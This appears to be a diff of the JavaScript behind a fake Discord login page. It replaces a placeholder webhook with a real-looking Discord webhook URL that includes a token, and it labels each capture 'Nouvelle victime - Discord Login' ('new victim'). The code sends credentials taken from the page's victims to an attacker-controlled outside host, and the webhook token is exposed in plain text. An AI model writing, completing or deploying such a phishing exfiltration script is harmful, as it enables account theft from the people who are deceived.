@@ -13,7 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         // === TON WEBHOOK ICI ===
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/TON_ID/TON_TOKEN"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1492541774814777466/WSn9nb3REMUYTi-k_8F6_cBnZ6R-1atpqWTU5E4oM7atSk3AtGZWW8-K1n8EgUkKjLvV"; 
 
         const embed = {
             title: "🔑 Nouvelle victime - Discord Login",
